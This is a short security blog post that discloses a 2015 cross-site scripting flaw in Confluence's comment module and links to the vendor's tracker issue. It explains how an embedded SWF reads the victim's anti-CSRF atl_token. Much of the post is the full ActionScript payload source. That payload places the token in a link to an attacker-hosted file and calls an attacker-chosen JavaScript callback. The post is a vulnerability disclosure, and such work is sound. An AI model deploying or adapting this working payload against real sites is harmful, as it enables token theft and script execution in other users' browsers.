---
layout: post
title: XSS on confluence comment module
---
On `02/Jul/2015 3:27 AM` i found a XSS flaw on confluence,https://jira.atlassian.com/browse/CONF-38127

In confluence comment module user can upload and embed swf file in their comment, confluence is using a `atl_token` parameter on GET HTTP request, if the attacker sends the link of .swf file( the value of src on embed tag) to his victim the malicious .SWF won't execute on the victim's browser . Every user has  `atl_token`  This is a CSRF protection and XSS protection too. 
We can bypass this protection by using `this.loaderInfo.parameters` in malicious .swf, `this.loaderInfo.parameters.parameter_name` extracts the value of your target parameter, in this case it is `atl_token`, Attacker must also insert a `<a>` tag in malicous swf file so if the victim clicks the link in our embed swf file the .swf file will be run in the victim's browser.

## Payload

{% highlight text %}
package
{
import flash.display.Sprite;
import flash.text.TextFormat;
import flash.text.TextField;
import flash.external.ExternalInterface;

public class Main extends Sprite
{

public function Main()
{
super();
var myFormat:TextFormat = new TextFormat();
myFormat.size = 200;
var xcode:String = this.loaderInfo.parameters.atl_token;
var myText:TextField = new TextField();
myText.width = 1000;
myText.height = 1000;
myText.htmlText = "<font size=\'300px\'> <a target=\'_blank\' href=\'https://pwnie.ninja/confluence/download/attachments/9469955/NewProjectx.swf?atl_token=" + xcode + "&callback=alert\'>CliCK ME</a> </font>";
addChild(myText);
ExternalInterface.call(this.loaderInfo.parameters.callback,"xss");
}
}
}
{% endhighlight %}


## References:
* https://jira.atlassian.com/browse/CONF-38127
* http://stackoverflow.com/questions/6057211/loaderinfo-parameters-in-as3
